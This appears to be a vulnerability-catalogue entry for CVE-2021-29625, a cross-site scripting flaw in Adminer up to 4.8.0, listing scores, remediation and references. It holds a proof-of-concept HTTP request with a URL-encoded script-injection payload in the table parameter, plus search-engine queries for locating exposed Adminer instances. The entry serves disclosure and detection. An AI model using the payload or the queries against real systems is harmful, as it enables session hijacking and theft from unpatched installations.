---
layout: post
cve_id: CVE-2021-29625
title: Adminer <=4.8.0 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-29625.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-29625.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  inject malicious scripts into the Adminer interface, potentially leading to session
  hijacking, defacement, or theft of sensitive information.

  '
remediation: This vulnerability is patched in version 4.8.1. As workarounds, one can
  use a browser supporting strict CSP or enable the native PHP extensions (e.g. `mysqli`)
  or disable displaying PHP errors (`display_errors`).
reference:
- https://sourceforge.net/p/adminer/bugs-and-features/797/
- https://github.com/vrana/adminer/commit/4043092ec2c0de2258d60a99d0c5958637d051a7
- https://nvd.nist.gov/vuln/detail/CVE-2021-29625
- https://github.com/vrana/adminer/security/advisories/GHSA-2v82-5746-vwqc
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-29625
  cwe-id: CWE-79
  epss-score: 0.70255
  epss-percentile: 0.98628
  cpe: cpe:2.3:a:adminer:adminer:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: adminer
  product: adminer
  shodan-query:
  - http.title:"login - adminer"
  - cpe:"cpe:2.3:a:adminer:adminer"
  fofa-query:
  - app="adminer" && body="4.7.8"
  - title="login - adminer"
  google-query: intitle:"login - adminer"
  hunter-query: app.name="adminer"&&web.body="4.7.8"
tags:
- cve2021
- cve
- adminer
- xss
- sqli
- vuln
---

## ðŸ” Vulnerability Description
Adminer 4.6.1 to 4.8.0 contains a cross-site scripting vulnerability which affects users of MySQL, MariaDB, PgSQL, and SQLite in browsers without CSP when Adminer uses a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled).

## ðŸŒ HTTP Request
```nohighlight
GET /?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

